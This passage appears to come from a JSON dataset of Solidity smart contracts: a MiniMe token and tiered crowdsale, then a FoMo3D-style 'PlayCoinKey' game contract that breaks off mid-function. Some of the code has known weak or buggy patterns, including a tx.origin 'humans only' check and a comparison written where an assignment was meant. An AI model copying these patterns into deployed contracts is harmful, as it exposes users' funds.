{\n return 0;\n }\n } else {\n return getValueAt(totalSupplyHistory, _blockNumber);\n }\n }\n function createCloneToken(\n string _cloneTokenName,\n uint8 _cloneDecimalUnits,\n string _cloneTokenSymbol,\n uint _snapshotBlock,\n bool _transfersEnabled\n ) public returns(address) {\n if (_snapshotBlock == 0) _snapshotBlock = block.number;\n MiniMeToken cloneToken = tokenFactory.createCloneToken(\n this,\n _snapshotBlock,\n _cloneTokenName,\n _cloneDecimalUnits,\n _cloneTokenSymbol,\n _transfersEnabled\n );\n cloneToken.changeController(msg.sender);\n NewCloneToken(address(cloneToken), _snapshotBlock);\n return address(cloneToken);\n }\n function generateTokens(address _owner, uint _amount\n ) public onlyController returns (bool) {\n uint curTotalSupply = totalSupply();\n require(curTotalSupply + _amount >= curTotalSupply);\n uint previousBalanceTo = balanceOf(_owner);\n require(previousBalanceTo + _amount >= previousBalanceTo);\n updateValueAtNow(totalSupplyHistory, curTotalSupply + _amount);\n updateValueAtNow(balances[_owner], previousBalanceTo + _amount);\n Transfer(0, _owner, _amount);\n return true;\n }\n function destroyTokens(address _owner, uint _amount\n ) onlyController public returns (bool) {\n uint curTotalSupply = totalSupply();\n require(curTotalSupply >= _amount);\n uint previousBalanceFrom = balanceOf(_owner);\n require(previousBalanceFrom >= _amount);\n updateValueAtNow(totalSupplyHistory, curTotalSupply - _amount);\n updateValueAtNow(balances[_owner], previousBalanceFrom - _amount);\n Transfer(_owner, 0, _amount);\n return true;\n }\n function enableTransfers(bool _transfersEnabled) public onlyController {\n transfersEnabled = _transfersEnabled;\n }\n function getValueAt(Checkpoint[] storage checkpoints, uint _block\n ) constant internal returns (uint) {\n if (checkpoints.length == 0) return 0;\n if (_block >= checkpoints[checkpoints.length-1].fromBlock)\n return checkpoints[checkpoints.length-1].value;\n if (_block < checkpoints[0].fromBlock) return 0;\n uint min = 0;\n uint max = checkpoints.length-1;\n while (max > min) {\n uint mid = (max + min + 1)/ 2;\n if (checkpoints[mid].fromBlock<=_block) {\n min = mid;\n } else {\n max = mid-1;\n }\n }\n return checkpoints[min].value;\n }\n function updateValueAtNow(Checkpoint[] storage checkpoints, uint _value\n ) internal {\n if ((checkpoints.length == 0)\n || (checkpoints[checkpoints.length -1].fromBlock < block.number)) {\n Checkpoint storage newCheckPoint = checkpoints[ checkpoints.length++ ];\n newCheckPoint.fromBlock = uint128(block.number);\n newCheckPoint.value = uint128(_value);\n } else {\n Checkpoint storage oldCheckPoint = checkpoints[checkpoints.length-1];\n oldCheckPoint.value = uint128(_value);\n }\n }\n function isContract(address _addr) constant internal returns(bool) {\n uint size;\n if (_addr == 0) return false;\n assembly {\n size := extcodesize(_addr)\n }\n return size>0;\n }\n function min(uint a, uint b) pure internal returns (uint) {\n return a < b ? a : b;\n }\n function () public payable {\n require(isContract(controller));\n require(TokenController(controller).proxyPayment.value(msg.value)(msg.sender));\n }\n function claimTokens(address _token) public onlyController {\n if (_token == 0x0) {\n controller.transfer(this.balance);\n return;\n }\n MiniMeToken token = MiniMeToken(_token);\n uint balance = token.balanceOf(this);\n token.transfer(controller, balance);\n ClaimedTokens(_token, controller, balance);\n }\n event ClaimedTokens(address indexed _token, address indexed _controller, uint _amount);\n event Transfer(address indexed _from, address indexed _to, uint256 _amount);\n event NewCloneToken(address indexed _cloneToken, uint _snapshotBlock);\n event Approval(\n address indexed _owner,\n address indexed _spender,\n uint256 _amount\n );\n}\ncontract MiniMeTokenFactory {\n function createCloneToken(\n address _parentToken,\n uint _snapshotBlock,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol,\n bool _transfersEnabled\n ) public returns (MiniMeToken) {\n MiniMeToken newToken = new MiniMeToken(\n this,\n _parentToken,\n _snapshotBlock,\n _tokenName,\n _decimalUnits,\n _tokenSymbol,\n _transfersEnabled\n );\n newToken.changeController(msg.sender);\n return newToken;\n }\n}\ncontract Whitelist is Ownable {\n mapping(address => bool) public whitelist;\n event WhitelistedAddressAdded(address addr);\n event WhitelistedAddressRemoved(address addr);\n modifier onlyWhitelisted() {\n require(whitelist[msg.sender]);\n _;\n }\n function addAddressToWhitelist(address addr) onlyOwner public returns(bool success) {\n if (!whitelist[addr]) {\n whitelist[addr] = true;\n WhitelistedAddressAdded(addr);\n success = true;\n }\n }\n function addAddressesToWhitelist(address[] addrs) onlyOwner public returns(bool success) {\n for (uint256 i = 0; i < addrs.length; i++) {\n if (addAddressToWhitelist(addrs[i])) {\n success = true;\n }\n }\n }\n function removeAddressFromWhitelist(address addr) onlyOwner public returns(bool success) {\n if (whitelist[addr]) {\n whitelist[addr] = false;\n WhitelistedAddressRemoved(addr);\n success = true;\n }\n }\n function removeAddressesFromWhitelist(address[] addrs) onlyOwner public returns(bool success) {\n for (uint256 i = 0; i < addrs.length; i++) {\n if (removeAddressFromWhitelist(addrs[i])) {\n success = true;\n }\n }\n }\n}\ncontract Crowdsale is Presale, Pausable, CanReclaimToken, Whitelist {\n using SafeMath for uint256;\n address public whitelistAddress;\n address public wallet;\n MiniMeToken public token;\n uint256 private weiRaised = 0;\n uint256 private cap = 0;\n bool private publicSaleInitialized = false;\n bool private finalized = false;\n uint256 private tokensSold = 0;\n uint256 private startTime;\n uint256 private endTime;\n uint256 public maxTokens;\n mapping(address => uint256) public contributions;\n mapping(address => uint256) public investorCaps;\n address[] public investors;\n address[] public founders;\n address[] public advisors;\n VestingTrustee public trustee;\n address public reserveWallet;\n struct Tier {\n uint256 rate;\n uint256 max;\n }\n uint public privateSaleTokensAvailable;\n uint public privateSaleTokensSold = 0;\n uint public publicTokensAvailable;\n uint8 public totalTiers = 0;\n bool public tiersInitialized = false;\n uint256 public maxTiers = 6;\n Tier[6] public tiers;\n event TokenPurchase(address indexed purchaser, uint256 value, uint256 amount);\n enum Stage { Preparing, Presale, PresaleFinished, PublicSale, Success, Finalized }\n function Crowdsale(\n uint256 _presaleStartTime,\n uint256 _presaleDuration,\n uint256 _presaleRate,\n uint256 _presaleCap,\n address erc20Token,\n address _wallet,\n uint8 _tiers,\n uint256 _cap,\n address _reserveWallet)\n public\n Presale(_presaleStartTime, _presaleDuration, _presaleRate, _presaleCap)\n {\n require(_wallet != address(0));\n require(erc20Token != address(0));\n require(_tiers > 0 && _tiers <= maxTiers);\n require(_cap > 0);\n require(_reserveWallet != address(0));\n token = MiniMeToken(erc20Token);\n wallet = _wallet;\n totalTiers = _tiers;\n cap = _cap;\n reserveWallet = _reserveWallet;\n trustee = new VestingTrustee(erc20Token);\n maxTokens = 1000000000 * (10 ** 18);\n privateSaleTokensAvailable = maxTokens.mul(22).div(100);\n publicTokensAvailable = maxTokens.mul(28).div(100);\n super.addAddressToWhitelist(msg.sender);\n }\n function() public payable {\n buyTokens(msg.sender, msg.value);\n }\n function getStage() public constant returns(Stage) {\n if (finalized) return Stage.Finalized;\n if (!tiersInitialized || !Presale.hasStarted()) return Stage.Preparing;\n if (!Presale.hasEnded()) return Stage.Presale;\n if (Presale.hasEnded() && !hasStarted()) return Stage.PresaleFinished;\n if (!hasEnded()) return Stage.PublicSale;\n if (hasEnded()) return Stage.Success;\n return Stage.Preparing;\n }\n modifier inStage(Stage _stage) {\n require(getStage() == _stage);\n _;\n }\n function initTiers(uint256[] rates, uint256[] totalWeis) public onlyWhitelisted returns(uint256) {\n require(token.controller() == address(this));\n require(!tiersInitialized);\n require(rates.length == totalTiers && rates.length == totalWeis.length);\n uint256 tierMax = 0;\n for (uint8 i=0; i < totalTiers; i++) {\n require(totalWeis[i] > 0 && rates[i] > 0);\n tierMax = tierMax.add(totalWeis[i]);\n tiers[i] = Tier({\n rate: rates[i],\n max: tierMax\n });\n }\n require(tierMax == cap);\n tiersInitialized = true;\n return tierMax;\n }\n function setCapForParticipants(address[] participants, uint256[] caps) onlyWhitelisted public {\n require(participants.length <= 50 && participants.length == caps.length);\n for (uint8 i=0; i < participants.length; i++) {\n investorCaps[participants[i]] = caps[i];\n }\n }\n function addGrant(address assignee, uint256 value, bool isFounder) public onlyWhitelisted whenNotPaused {\n require(value > 0);\n require(assignee != address(0));\n uint256 start;\n uint256 cliff;\n uint256 vestingPercentage;\n uint256 initialTokens;\n if(isFounder) {\n start = now;\n cliff = start + 12*30 days;\n vestingPercentage = 20;\n founders.push(assignee);\n }\n else {\n initialTokens = value.mul(10).div(100);\n transferTokens(assignee, initialTokens);\n start = now;\n cliff = start + 6*30 days;\n vestingPercentage = 15;\n advisors.push(assignee);\n }\n uint256 end = now + 3 * 1 years;\n uint256 installmentLength = 6 * 30 days;\n bool revokable = true;\n transferTokens(trustee, value.sub(initialTokens));\n trustee.grant(assignee, value, start, cliff, end, installmentLength, vestingPercentage, initialTokens, revokable);\n }\n function finalize() public onlyWhitelisted inStage(Stage.Success) {\n require(!finalized);\n trustee.transferOwnership(msg.sender);\n token.enableTransfers(true);\n uint256 unsold = maxTokens.sub(token.totalSupply());\n transferTokens(reserveWallet, unsold);\n token.changeController(0x0);\n finalized = true;\n }\n function startPublicSale(uint _startTime, uint _duration) public onlyWhitelisted inStage(Stage.PresaleFinished) {\n require(_startTime >= now);\n require(_duration > 0);\n startTime = _startTime;\n endTime = _startTime + _duration * 1 days;\n publicSaleInitialized = true;\n }\n function totalWei() public constant returns(uint256) {\n uint256 presaleWei = super.totalWei();\n return presaleWei.add(weiRaised);\n }\n function totalPublicSaleWei() public constant returns(uint256) {\n return weiRaised;\n }\n function totalCap() public constant returns(uint256) {\n uint256 presaleCap = super.totalCap();\n return presaleCap.add(cap);\n }\n function totalTokens() public constant returns(uint256) {\n return tokensSold;\n }\n function buyTokens(address purchaser, uint256 value) internal whenNotPaused returns(uint256) {\n require(value > 0);\n Stage stage = getStage();\n require(stage == Stage.Presale || stage == Stage.PublicSale);\n uint256 purchaseAmount = Math.min256(value, investorCaps[purchaser].sub(contributions[purchaser]));\n require(purchaseAmount > 0);\n uint256 numTokens;\n if (stage == Stage.Presale) {\n if (Presale.totalWei().add(purchaseAmount) > Presale.totalCap()) {\n purchaseAmount = Presale.capRemaining();\n }\n numTokens = Presale.buyTokens(purchaser, purchaseAmount);\n } else if (stage == Stage.PublicSale) {\n uint totalWei = weiRaised.add(purchaseAmount);\n uint8 currentTier = getTier(weiRaised);\n if (totalWei >= cap) {\n totalWei = cap;\n purchaseAmount = cap.sub(weiRaised);\n }\n if (totalWei <= tiers[currentTier].max) {\n numTokens = purchaseAmount.mul(tiers[currentTier].rate);\n } else {\n uint remaining = tiers[currentTier].max.sub(weiRaised);\n numTokens = remaining.mul(tiers[currentTier].rate);\n uint256 excess = totalWei.sub(tiers[currentTier].max);\n numTokens = numTokens.add(excess.mul(tiers[currentTier + 1].rate));\n }\n weiRaised = weiRaised.add(purchaseAmount);\n }\n require(tokensSold.add(numTokens) <= publicTokensAvailable);\n tokensSold = tokensSold.add(numTokens);\n forwardFunds(purchaser, purchaseAmount);\n transferTokens(purchaser, numTokens);\n if (value.sub(purchaseAmount) > 0) {\n msg.sender.transfer(value.sub(purchaseAmount));\n }\n TokenPurchase(purchaser, numTokens, purchaseAmount);\n return numTokens;\n }\n function forwardFunds(address purchaser, uint256 value) internal {\n if (contributions[purchaser] == 0) {\n investors.push(purchaser);\n }\n contributions[purchaser] = contributions[purchaser].add(value);\n wallet.transfer(value);\n }\n function changeEndTime(uint _endTime) public onlyWhitelisted {\n endTime = _endTime;\n }\n function changeFundsWallet(address _newWallet) public onlyWhitelisted {\n require(_newWallet != address(0));\n wallet = _newWallet;\n }\n function changeTokenController() onlyWhitelisted public {\n token.changeController(msg.sender);\n }\n function changeTrusteeOwner() onlyWhitelisted public {\n trustee.transferOwnership(msg.sender);\n }\n function changeReserveWallet(address _reserve) public onlyWhitelisted {\n require(_reserve != address(0));\n reserveWallet = _reserve;\n }\n function setWhitelistAddress(address _whitelist) public onlyWhitelisted {\n require(_whitelist != address(0));\n whitelistAddress = _whitelist;\n }\n function transferTokens(address to, uint256 value) internal {\n token.generateTokens(to, value);\n }\n function sendPrivateSaleTokens(address to, uint256 value) public whenNotPaused onlyWhitelisted {\n require(privateSaleTokensSold.add(value) <= privateSaleTokensAvailable);\n privateSaleTokensSold = privateSaleTokensSold.add(value);\n transferTokens(to, value);\n }\n function hasEnded() internal constant returns(bool) {\n return now > endTime || weiRaised >= cap;\n }\n function hasStarted() internal constant returns(bool) {\n return publicSaleInitialized && now >= startTime;\n }\n function getTier(uint256 _weiRaised) internal constant returns(uint8) {\n for (uint8 i = 0; i < totalTiers; i++) {\n if (_weiRaised < tiers[i].max) {\n return i;\n }\n }\n return totalTiers + 1;\n }\n function getCurrentTier() public constant returns(uint8) {\n return getTier(weiRaised);\n }\n function proxyPayment(address _owner) public payable returns(bool) {\n return true;\n }\n function onApprove(address _owner, address _spender, uint _amount) public returns(bool) {\n return true;\n }\n function onTransfer(address _from, address _to, uint _amount) public returns(bool) {\n return true;\n }\n function getTokenSaleTime() public constant returns(uint256, uint256) {\n return (startTime, endTime);\n }\n}",
  "extract_feature": [
    "function balanceOf(address _owner) public constant returns (uint256 balance) {\nreturn balanceOfAt(_owner, block.number);\n}",
    "function totalSupply() public constant returns (uint) {\nreturn totalSupplyAt(block.number);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6b750a970a4fdc0b76"
  },
  "filename": "3286.sol",
  "content": "pragma solidity ^0.4.24;\ncontract PCKevents {\n event onNewName\n (\n uint256 indexed playerID,\n address indexed playerAddress,\n bytes32 indexed playerName,\n bool isNewPlayer,\n uint256 affiliateID,\n address affiliateAddress,\n bytes32 affiliateName,\n uint256 amountPaid,\n uint256 timeStamp\n );\n event onEndTx\n (\n uint256 compressedData,\n uint256 compressedIDs,\n bytes32 playerName,\n address playerAddress,\n uint256 ethIn,\n uint256 keysBought,\n address winnerAddr,\n bytes32 winnerName,\n uint256 amountWon,\n uint256 newPot,\n uint256 PCPAmount,\n uint256 genAmount,\n uint256 potAmount,\n uint256 airDropPot\n );\n event onWithdraw\n (\n uint256 indexed playerID,\n address playerAddress,\n bytes32 playerName,\n uint256 ethOut,\n uint256 timeStamp\n );\n event onWithdrawAndDistribute\n (\n address playerAddress,\n bytes32 playerName,\n uint256 ethOut,\n uint256 compressedData,\n uint256 compressedIDs,\n address winnerAddr,\n bytes32 winnerName,\n uint256 amountWon,\n uint256 newPot,\n uint256 PCPAmount,\n uint256 genAmount\n );\n event onBuyAndDistribute\n (\n address playerAddress,\n bytes32 playerName,\n uint256 ethIn,\n uint256 compressedData,\n uint256 compressedIDs,\n address winnerAddr,\n bytes32 winnerName,\n uint256 amountWon,\n uint256 newPot,\n uint256 PCPAmount,\n uint256 genAmount\n );\n event onReLoadAndDistribute\n (\n address playerAddress,\n bytes32 playerName,\n uint256 compressedData,\n uint256 compressedIDs,\n address winnerAddr,\n bytes32 winnerName,\n uint256 amountWon,\n uint256 newPot,\n uint256 PCPAmount,\n uint256 genAmount\n );\n event onAffiliatePayout\n (\n uint256 indexed affiliateID,\n address affiliateAddress,\n bytes32 affiliateName,\n uint256 indexed roundID,\n uint256 indexed buyerID,\n uint256 amount,\n uint256 timeStamp\n );\n event onPotSwapDeposit\n (\n uint256 roundID,\n uint256 amountAddedToPot\n );\n}\ncontract modularKey is PCKevents {}\ncontract PlayCoinKey is modularKey {\n using SafeMath for *;\n using NameFilter for string;\n using PCKKeysCalcLong for uint256;\n otherPCK private otherPCK_;\n PlayCoinGodInterface constant private PCGod = PlayCoinGodInterface(0x6f93Be8fD47EBb62F54ebd149B58658bf9BaCF4f);\n ProForwarderInterface constant private Pro_Inc = ProForwarderInterface(0x97354A7281693b7C93f6348Ba4eC38B9DDd76D6e);\n PlayerBookInterface constant private PlayerBook = PlayerBookInterface(0x47D1c777f1853cac97E6b81226B1F5108FBD7B81);\n string constant public name = \"PlayCoin Key\";\n string constant public symbol = \"PCK\";\n uint256 private rndExtra_ = 15 minutes;\n uint256 private rndGap_ = 15 minutes;\n uint256 constant private rndInit_ = 12 hours;\n uint256 constant private rndInc_ = 30 seconds;\n uint256 constant private rndMax_ = 6 hours;\n uint256 constant private rndMin_ = 10 minutes;\n uint256 public rndReduceThreshold_ = 10e18;\n bool public closed_ = false;\n address private admin = msg.sender;\n uint256 public airDropPot_;\n uint256 public airDropTracker_ = 0;\n uint256 public rID_;\n mapping (address => uint256) public pIDxAddr_;\n mapping (bytes32 => uint256) public pIDxName_;\n mapping (uint256 => PCKdatasets.Player) public plyr_;\n mapping (uint256 => mapping (uint256 => PCKdatasets.PlayerRounds)) public plyrRnds_;\n mapping (uint256 => mapping (bytes32 => bool)) public plyrNames_;\n mapping (uint256 => PCKdatasets.Round) public round_;\n mapping (uint256 => mapping(uint256 => uint256)) public rndTmEth_;\n mapping (uint256 => PCKdatasets.TeamFee) public fees_;\n mapping (uint256 => PCKdatasets.PotSplit) public potSplit_;\n constructor()\n public\n {\n fees_[0] = PCKdatasets.TeamFee(30,6);\n fees_[1] = PCKdatasets.TeamFee(43,0);\n fees_[2] = PCKdatasets.TeamFee(56,10);\n fees_[3] = PCKdatasets.TeamFee(43,8);\n potSplit_[0] = PCKdatasets.PotSplit(15,10);\n potSplit_[1] = PCKdatasets.PotSplit(25,0);\n potSplit_[2] = PCKdatasets.PotSplit(20,20);\n potSplit_[3] = PCKdatasets.PotSplit(30,10);\n }\n modifier isActivated() {\n require(activated_ == true, \"its not ready yet. check ?eta in discord\");\n _;\n }\n modifier isRoundActivated() {\n require(round_[rID_].ended == false, \"the round is finished\");\n _;\n }\n modifier isHuman() {\n address _addr = msg.sender;\n uint256 _codeLength;\n require(msg.sender == tx.origin, \"sorry humans only\");\n _;\n }\n modifier isWithinLimits(uint256 _eth) {\n require(_eth >= 1000000000, \"pocket lint: not a valid currency\");\n require(_eth <= 100000000000000000000000, \"no vitalik, no\");\n _;\n }\n modifier onlyAdmins() {\n require(msg.sender == admin, \"onlyAdmins failed - msg.sender is not an admin\");\n _;\n }\n function kill () onlyAdmins() public {\n require(round_[rID_].ended == true && closed_ == true, \"the round is active or not close\");\n selfdestruct(admin);\n }\n function getRoundStatus() isActivated() public view returns(uint256, bool){\n return (rID_, round_[rID_].ended);\n }\n function setThreshold(uint256 _threshold) onlyAdmins() public returns(uint256) {\n rndReduceThreshold_ = _threshold;\n return rndReduceThreshold_;\n }\n function setEnforce(bool _closed) onlyAdmins() public returns(bool) {\n closed_ = _closed;\n if( !closed_ && round_[rID_].ended == true && activated_ == true ){\n nextRound();\n }\n return closed_;\n }\n function()\n isActivated()\n isRoundActivated()\n isHuman()\n isWithinLimits(msg.value)\n public\n payable\n {\n PCKdatasets.EventReturns memory _eventData_ = determinePID(_eventData_);\n uint256 _pID = pIDxAddr_[msg.sender];\n buyCore(_pID, plyr_[_pID].laff, 2, _eventData_);\n }\n function buyXid(uint256 _affCode, uint256 _team)\n isActivated()\n isRoundActivated()\n isHuman()\n isWithinLimits(msg.value)\n public\n payable\n {\n PCKdatasets.EventReturns memory _eventData_ = determinePID(_eventData_);\n uint256 _pID = pIDxAddr_[msg.sender];\n if (_affCode == 0 || _affCode == _pID)\n {\n _affCode = plyr_[_pID].laff;\n } else if (_affCode != plyr_[_pID].laff) {\n plyr_[_pID].laff = _affCode;\n }\n _team = verifyTeam(_team);\n buyCore(_pID, _affCode, _team, _eventData_);\n }\n function buyXaddr(address _affCode, uint256 _team)\n isActivated()\n isRoundActivated()\n isHuman()\n isWithinLimits(msg.value)\n public\n payable\n {\n PCKdatasets.EventReturns memory _eventData_ = determinePID(_eventData_);\n uint256 _pID = pIDxAddr_[msg.sender];\n uint256 _affID;\n if (_affCode == address(0) || _affCode == msg.sender)\n {\n _affID = plyr_[_pID].laff;\n } else {\n _affID = pIDxAddr_[_affCode];\n if (_affID != plyr_[_pID].laff)\n {\n plyr_[_pID].laff = _affID;\n }\n }\n _team = verifyTeam(_team);\n buyCore(_pID, _affID, _team, _eventData_);\n }\n function buyXname(bytes32 _affCode, uint256 _team)\n isActivated()\n isRoundActivated()\n isHuman()\n isWithinLimits(msg.value)\n public\n payable\n {\n PCKdatasets.EventReturns memory _eventData_ = determinePID(_eventData_);\n uint256 _pID = pIDxAddr_[msg.sender];\n uint256 _affID;\n if (_affCode == '' || _affCode == plyr_[_pID].name)\n {\n _affID = plyr_[_pID].laff;\n } else {\n _affID = pIDxName_[_affCode];\n if (_affID != plyr_[_pID].laff)\n {\n plyr_[_pID].laff = _affID;\n }\n }\n _team = verifyTeam(_team);\n buyCore(_pID, _affID, _team, _eventData_);\n }\n function reLoadXid(uint256 _affCode, uint256 _team, uint256 _eth)\n isActivated()\n isRoundActivated()\n isHuman()\n isWithinLimits(_eth)\n public\n {\n PCKdatasets.EventReturns memory _eventData_;\n uint256 _pID = pIDxAddr_[msg.sender];\n if (_affCode == 0 || _affCode == _pID)\n {\n _affCode = plyr_[_pID].laff;\n } else if (_affCode != plyr_[_pID].laff) {\n plyr_[_pID].laff = _affCode;\n }\n _team = verifyTeam(_team);\n reLoadCore(_pID, _affCode, _team, _eth, _eventData_);\n }\n function reLoadXaddr(address _affCode, uint256 _team, uint256 _eth)\n isActivated()\n isRoundActivated()\n isHuman()\n isWithinLimits(_eth)\n public\n {\n PCKdatasets.EventReturns memory _eventData_;\n uint256 _pID = pIDxAddr_[msg.sender];\n uint256 _affID;\n if (_affCode == address(0) || _affCode == msg.sender)\n {\n _affID = plyr_[_pID].laff;\n } else {\n _affID = pIDxAddr_[_affCode];\n if (_affID != plyr_[_pID].laff)\n {\n plyr_[_pID].laff = _affID;\n }\n }\n _team = verifyTeam(_team);\n reLoadCore(_pID, _affID, _team, _eth, _eventData_);\n }\n function reLoadXname(bytes32 _affCode, uint256 _team, uint256 _eth)\n isActivated()\n isRoundActivated()\n isHuman()\n isWithinLimits(_eth)\n public\n {\n PCKdatasets.EventReturns memory _eventData_;\n uint256 _pID = pIDxAddr_[msg.sender];\n uint256 _affID;\n if (_affCode == '' || _affCode == plyr_[_pID].name)\n {\n _affID = plyr_[_pID].laff;\n } else {\n _affID = pIDxName_[_affCode];\n if (_affID != plyr_[_pID].laff)\n {\n plyr_[_pID].laff = _affID;\n }\n }\n _team = verifyTeam(_team);\n reLoadCore(_pID, _affID, _team, _eth, _eventData_);\n }\n function withdraw()\n isActivated()\n isHuman()\n public\n {\n uint256 _rID = rID_;\n uint256 _now = now;\n uint256 _pID = pIDxAddr_[msg.sender];\n uint256 _eth;\n if (_now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0)\n {\n PCKdatasets.EventReturns memory _eventData_;\n round_[_rID].ended = true;\n _eventData_ = endRound(_eventData_);\n _eth = withdrawEarnings(_pID);\n if (_eth > 0)\n plyr_[_pID].addr.transfer(_eth);\n _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);\n _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;\n emit PCKevents.onWithdrawAndDistribute\n (\n msg.sender,\n plyr_[_pID].name,\n _eth,\n _eventData_.compressedData,\n _eventData_.compressedIDs,\n _eventData_.winnerAddr,\n _eventData_.winnerName,\n _eventData_.amountWon,\n _eventData_.newPot,\n _eventData_.PCPAmount,\n _eventData_.genAmount\n );\n } else {\n _eth = withdrawEarnings(_pID);\n if (_eth > 0)\n plyr_[_pID].addr.transfer(_eth);\n emit PCKevents.onWithdraw(_pID, msg.sender, plyr_[_pID].name, _eth, _now);\n }\n }\n function registerNameXID(string _nameString, uint256 _affCode, bool _all)\n isHuman()\n public\n payable\n {\n bytes32 _name = _nameString.nameFilter();\n address _addr = msg.sender;\n uint256 _paid = msg.value;\n (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXIDFromDapp.value(_paid)(_addr, _name, _affCode, _all);\n uint256 _pID = pIDxAddr_[_addr];\n emit PCKevents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);\n }\n function registerNameXaddr(string _nameString, address _affCode, bool _all)\n isHuman()\n public\n payable\n {\n bytes32 _name = _nameString.nameFilter();\n address _addr = msg.sender;\n uint256 _paid = msg.value;\n (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXaddrFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all);\n uint256 _pID = pIDxAddr_[_addr];\n emit PCKevents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);\n }\n function registerNameXname(string _nameString, bytes32 _affCode, bool _all)\n isHuman()\n public\n payable\n {\n bytes32 _name = _nameString.nameFilter();\n address _addr = msg.sender;\n uint256 _paid = msg.value;\n (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXnameFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all);\n uint256 _pID = pIDxAddr_[_addr];\n emit PCKevents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);\n }\n function getBuyPrice()\n public\n view\n returns(uint256)\n {\n uint256 _rID = rID_;\n uint256 _now = now;\n if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))\n return ( (round_[_rID].keys.add(1000000000000000000)).ethRec(1000000000000000000) );\n else\n return ( 75000000000000 );\n }\n function getTimeLeft()\n public\n view\n returns(uint256)\n {\n uint256 _rID = rID_;\n uint256 _now = now;\n if (_now < round_[_rID].end)\n if (_now > round_[_rID].strt + rndGap_)\n return( (round_[_rID].end).sub(_now) );\n else\n return( (round_[_rID].strt + rndGap_).sub(_now) );\n else\n return(0);\n }\n function getPlayerVaults(uint256 _pID)\n public\n view\n returns(uint256 ,uint256, uint256)\n {\n uint256 _rID = rID_;\n if (now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0)\n {\n if (round_[_rID].plyr == _pID)\n {\n return\n (\n (plyr_[_pID].win).add( ((round_[_rID].pot).mul(48)) / 100 ),\n (plyr_[_pID].gen).add( getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask) ),\n plyr_[_pID].aff\n );\n } else {\n return\n (\n plyr_[_pID].win,\n (plyr_[_pID].gen).add( getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask) ),\n plyr_[_pID].aff\n );\n }\n } else {\n return\n (\n plyr_[_pID].win,\n (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),\n plyr_[_pID].aff\n );\n }\n }\n function getPlayerVaultsHelper(uint256 _pID, uint256 _rID)\n private\n view\n returns(uint256)\n {\n return( ((((round_[_rID].mask).add(((((round_[_rID].pot).mul(potSplit_[round_[_rID].team].gen)) / 100).mul(1000000000000000000)) / (round_[_rID].keys))).mul(plyrRnds_[_pID][_rID].keys)) / 1000000000000000000) );\n }\n function getCurrentRoundInfo()\n public\n view\n returns(uint256, uint256, uint256, uint256, uint256, uint256, uint256, address, bytes32, uint256, uint256, uint256, uint256, uint256)\n {\n uint256 _rID = rID_;\n return\n (\n round_[_rID].ico,\n _rID,\n round_[_rID].keys,\n round_[_rID].end,\n round_[_rID].strt,\n round_[_rID].pot,\n (round_[_rID].team + (round_[_rID].plyr * 10)),\n plyr_[round_[_rID].plyr].addr,\n plyr_[round_[_rID].plyr].name,\n rndTmEth_[_rID][0],\n rndTmEth_[_rID][1],\n rndTmEth_[_rID][2],\n rndTmEth_[_rID][3],\n airDropTracker_ + (airDropPot_ * 1000)\n );\n }\n function getPlayerInfoByAddress(address _addr)\n public\n view\n returns(uint256, bytes32, uint256, uint256, uint256, uint256, uint256)\n {\n uint256 _rID = rID_;\n if (_addr == address(0))\n {\n _addr == msg.sender;\n }\n uint256 _pID = pIDxAddr_[_addr];\n return\n (\n _pID,\n plyr_[_pID].name,\n plyrRnds_[_pID][_rID].keys,\n plyr_[_pID].win,\n (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),\n plyr_[_pID].aff,\n plyrRnds_[_pID][_rID].eth\n );\n }\n function buyCore(uint256 _pID, uint256 _affID, uint256 _team, PCKdatasets.EventReturns memory _eventData_) private {\n uint256 _rID = rID_;\n uint256 _now = now;\n if (!closed_ && _now > (round_[_rID].strt + rndGap_) && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))\n {\n core(_rID, _pID, msg.value, _affID, _team, _eventData_);\n } else {\n if ( (closed_ || _now > round_[_rID].end ) && round_[_rID].ended == false ) {\n round_[_rID].ended = true;\n _eventData_ = endRound(_eventData_);\n if( !closed_ ){\n nextRound();\n }\n _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);\n _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;\n emit PCKevents.onBuyAndDistribute\n (\n msg.sender,\n plyr_[_pID].name,\n msg.value,\n _eventData_.compressedData,\n _eventData_.compressedIDs,\n _eventData_.winnerAddr,\n _eventData_.winnerName,\n _eventData_.amountWon,\n _eventData_.newPot,\n _eventData_.PCPAmount,\n _eventData_.genAmount\n );\n }\n plyr_[_pID].gen = plyr_[_pID].gen.add(msg.value);\n }\n }\n function reLoadCore(uint256 _pID, uint256 _affID, uint256 _team, uint256 _eth, PCKdatasets.EventReturns memory _eventData_) private {\n uint256 _rID = rID_;\n uint256 _now = now;\n if (!closed_ && _now > ( round_[_rID].strt + rndGap_ ) && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))\n {\n plyr_[_pID].gen = withdrawEarnings(_pID).sub(_eth);\n core(_rID, _pID, _eth, _affID, _team, _eventData_);\n } else if ( ( closed_ || _now > round_[_rID].end ) && round_[_rID].ended == false ) {\n round_[_rID].ended = true;\n _eventData_ = endRound(_eventData_);\n if( !closed_ ) {\n nextRound();\n }\n 